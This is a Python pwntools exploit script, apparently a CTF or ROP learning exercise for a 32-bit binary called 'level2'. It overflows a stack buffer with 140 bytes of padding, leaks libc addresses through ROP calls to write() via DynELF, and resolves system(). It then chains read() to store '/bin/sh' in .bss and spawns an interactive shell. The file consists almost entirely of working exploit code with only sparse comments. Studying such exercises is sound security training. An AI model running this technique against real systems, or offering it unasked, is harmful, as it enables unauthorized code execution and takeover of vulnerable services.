##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'

elf = ELF('./level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
main_addr = elf.symbols['main']
print 'start_addr= ' + hex(main_addr)

#https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(main_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%x => %s" % (address, (data or '').encode('hex'))
    return data


p = process('./level2')
#p = remote('127.0.0.1', 10002)

d = DynELF(leak, elf=elf)

system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr) #0xf753a850 0xf7e35850

bss_addr = elf.symbols['__bss_start']
print "bss_addr=" + hex(bss_addr)
pppr = 0x80484bd

# read(STDIN, &bss, 8)
payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
payload2 += p32(system_addr) + p32(main_addr) + p32(bss_addr)
#ss = raw_input()

print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")

p.interactive()

